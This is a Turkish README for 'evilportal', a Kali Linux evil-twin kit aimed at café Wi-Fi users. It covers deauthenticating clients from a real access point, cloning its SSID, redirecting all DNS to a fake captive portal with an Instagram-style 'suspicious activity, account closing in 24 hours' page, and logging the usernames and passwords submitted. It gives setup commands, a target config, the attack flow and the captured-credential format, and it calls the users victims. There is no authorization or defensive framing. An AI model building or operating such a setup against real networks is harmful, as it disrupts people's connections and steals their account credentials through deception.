# evilportal

Kali Linux üzerinde çalışan evil-twin + captive-portal sistemi:

**deauth → aynı SSID'li sahte AP → wildcard DNS → sahte doğrulama sayfası → credential capture → MAC whitelist ile gerçek internet**

---

## Gereksinimler

| Bileşen | Not |
|---|---|
| Kali Linux | root |
| Monitor mode destekli adaptör | deauth için |
| İkinci adaptör | AP için (önerilen) |
| `hostapd`, `dnsmasq` | `apt install hostapd dnsmasq` |
| `aircrack-ng` | `apt install aircrack-ng` |
| `ipset`, `iptables` | genelde kurulu |
| `flask` | `sudo apt install python3-flask` (veya `pip3 install flask --break-system-packages`) |

---

## Hızlı başlangıç

### A) GUI ile (önerilen)

```bash
cd evilportal
chmod +x setup.sh deauth.sh scan.sh
sudo python3 gui.py
```

Tarayıcıda `http://127.0.0.1:8099` aç:

1. **Arayüz** — monitor kartı, AP kartı, uplink
2. **Hedef** — SSID, BSSID, kanal, WPA parolası, portal sayfası
3. **Başlat** — canlı log, başlat/durdur
4. **Kayıtlar** — yakalanan bilgiler, otomatik yenilenir

“Portalı önizle” butonu seçili sahte sayfayı yeni sekmede gösterir.

GUI yalnızca `127.0.0.1`'i dinler. Kali'yi uzaktan yönetiyorsan SSH tüneli aç:

```bash
# kendi makinende
ssh -L 8099:127.0.0.1:8099 kali@hedef-ip
# sonra tarayıcıda
http://127.0.0.1:8099
```

### B) Terminal ile

```bash
cd evilportal
chmod +x setup.sh deauth.sh scan.sh

# 1) Hedefi bul
sudo ./scan.sh wlan0
#    Çıktıdaki BSSID / CH / ESSID değerlerini not al

# 2) config.sh'i düzenle
nano config.sh
#    TARGET_SSID, TARGET_BSSID, CHANNEL, MON_IF, AP_IF

# 3) Çalıştır
sudo ./setup.sh

# 4) Yakalananları izle (ayrı terminal)
python3 show.py -f

# 5) Durdur
Ctrl+C
```

`setup.sh` çıkışta otomatik temizlik yapar: iptables, ipset, hostapd, dnsmasq kapatılır, NetworkManager geri açılır.

---

## Ayar dosyası

```bash
# --- Arayüzler ---
MON_IF="wlan0"        # monitor (deauth)
AP_IF="wlan1"         # sahte AP
UPLINK_IF=""          # boş = otomatik bul
SINGLE_ADAPTER=0      # 1 = tek adaptör

# --- Hedef ---
TARGET_SSID="KafeWiFi"
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
CHANNEL=6
WPA_PASS=""           # hedef WPA2 ise parolası

# --- Ağ ---
GATEWAY_IP="10.0.0.1"
PORTAL_PORT=80
SHARE_INTERNET=1

# --- İçerik ---
PORTAL_TEMPLATE="instagram"   # instagram | verify
BRAND="Hesap Güvenliği Merkezi"
SUCCESS_URL="https://www.google.com"
```

---

## Kritik nokta: hedefin güvenlik tipi

Bu, sistemin çalışıp çalışmayacağını belirleyen tek şey:

| Hedef ağ | `WPA_PASS` | Sonuç |
|---|---|---|
| **Açık (open)** | boş | İstemciler otomatik bağlanır ✅ |
| **WPA2-PSK, parolayı biliyorsun** | parola | İstemciler otomatik bağlanır ✅ |
| **WPA2-PSK, parolayı bilmiyorsun** | boş | İstemci güvenlik uyuşmazlığı yüzünden **bağlanmaz** ❌ |
| **WPA3 / 802.1X** | — | Deauth PMF ile engellenir, twin bağlanmaz ❌ |

Yani bir kafe ağının parolasını bilmiyorsan ya o ağ açıktır (çoğu kafe böyledir) ya da bu teknik çalışmaz. WPA2-PSK hedefte parola bilinmeden twin'e bağlanma olmaz — çünkü istemci kayıtlı profiliyle 4-way handshake bekler, sen PSK'ya sahip olmadığın için tamamlayamaz.

---

## Akış

```
1. airmon-ng check kill          → NetworkManager susturulur
2. wlan0 → monitor, kanal kilit  → deauth hazır
3. wlan1 → 10.0.0.1, hostapd     → sahte AP yayında (aynı SSID)
4. dnsmasq                       → DHCP + tüm alan adları 10.0.0.1
5. iptables DNAT :80 → portal    → HTTP portalda biter
6. aireplay-ng --deauth döngüsü  → istemciler gerçek AP'den düşer
7. İstemci twin'e bağlanır       → OS probe → portal açılır
8. Form POST → capture/creds.log → ipset'e MAC eklenir → internet açılır
```

---

## Neden iki adaptör?

Tek radyo aynı anda hem deauth atıp hem AP yayınlayamaz. Gerçek AP hâlâ yayında olduğu için istemciler sürekli gerçek AP'ye dönmeye çalışır; deauth döngüsü bu yüzden şart. Deauth için bir adaptör, AP için başka bir adaptör gerekir.

`SINGLE_ADAPTER=1` ile sanal `evilmon` vif oluşturulur. Bazı yongalar (ath9k, mt76) bunu kaldırır, bazıları kaldırmaz. Kaldırıyorsa deauth verimi düşer.

---

## Portal davranışı

Her HTTP isteği portala düşer çünkü dnsmasq tüm alan adlarını `10.0.0.1`'e çözer. OS probe endpoint'leri (`/generate_204`, `/hotspot-detect.html`, `/connecttest.txt` …) 302 döner → işletim sistemi captive portal algılar ve kendi mini tarayıcısını açar.

HTTPS (443) doğrulanmamış istemciler için `tcp-reset` ile reddedilir. Bu yüzden kullanıcı portal dışına çıkamaz; tüm gezinme portalda kalır.

Form gönderildiğinde:

```json
{"ts":"2026-11-20 14:03:11","ip":"10.0.0.42","mac":"aa:bb:cc:dd:ee:ff",
 "username":"kisi@mail.com","password":"...","ua":"Mozilla/5.0 ..."}
```

satırı `capture/creds.log`'a yazılır, MAC `ipset portal_auth`'a eklenir, `thanks.html` gösterilir ve 2 saniye sonra `SUCCESS_URL`'e yönlendirilir. Bu noktadan sonra istemcinin interneti gerçekten açılır — kurban "doğruladım, düzeldi" hisseder.

---

## Sayfayı özelleştirme

`PORTAL_TEMPLATE` ile portal sayfası seçilir:

| Değer | Sayfa |
|---|---|
| `instagram` | Instagram görünümlü “şüpheli aktivite, 24 saat içinde kapatılacak” |
| `verify` | Genel “hesap doğrulama” sayfası |

`portal/templates/instagram.html` — logo, başlık, uyarı metni, form alanları.
`portal/templates/verify.html` — genel varyant.
`portal/templates/thanks.html` — doğrulama sonrası ekran.
`config.sh` içindeki `SUCCESS_URL` — iki template'te de kullanılır.

Form alanlarını değiştirirsen `portal/app.py` içindeki `request.form.get(...)`
anahtarlarını da güncelle.

---

## Kayıtları okuma

```bash
python3 show.py          # bir kere
python3 show.py -f       # canlı takip
```

---

## Sorun giderme

| Belirti | Sebep / çözüm |
|---|---|
| `hostapd başlatılamadı` | Adaptör AP mode desteklemiyor veya `AP_IF` yanlış. `logs/hostapd.log` |
| Portal açılmıyor | `dnsmasq` çalışıyor mu, `iptables -t nat -L -n -v` |
| İstemci bağlanmıyor | Hedef WPA2 ve `WPA_PASS` boş — yukarıdaki tablo |
| Deauth işe yaramıyor | 802.11w (PMF) aktif, ya da yanlış kanal/BSSID |
| Tek adaptörde AP düşüyor | Yongaset uyumsuz — ikinci adaptör kullan |
| İnternet gelmiyor | `UPLINK_IF` yanlış veya `ip_forward` kapalı |
| `ipset` bulunamadı | `apt install ipset` |

---

## Dosya yapısı

```
evilportal/
├── config.sh                 # tüm ayarlar
├── setup.sh                  # ana orkestrasyon
├── gui.py                    # adım adım yerel web GUI (127.0.0.1:8099)
├── deauth.sh                 # sürekli deauth döngüsü
├── scan.sh                   # hedef keşfi
├── show.py                   # yakalananları göster
├── portal/
│   ├── app.py                # Flask portal + capture + ipset
│   └── templates/
│       ├── instagram.html    # Instagram — şüpheli aktivite
│       ├── verify.html       # genel doğrulama
│       └── thanks.html       # doğrulama sonrası
├── capture/creds.log         # yakalananlar (runtime)
├── logs/                     # hostapd/dnsmasq/portal logları (runtime)
└── run/                      # geçici config + pid dosyaları (runtime)
```

---

## Sınırlar

- **WPA3 / 802.1X** hedeflerde deauth çalışmaz (PMF), twin bağlanmaz.
- **HTTPS içeriği** deşifre edilmez — portal sadece HTTP üzerinde çalışır, form verisi düz metin gider çünkü sayfa senin sunucundan geliyor.
- **iOS/macOS** captive portal WebView'i (.mobileconfig kurulumu) engeller; bu sistem sertifika yükletmez, kimlik avına dayanır.
- Kurban "Use without internet" / "Bağlantıyı kes" derse portal atlanır.
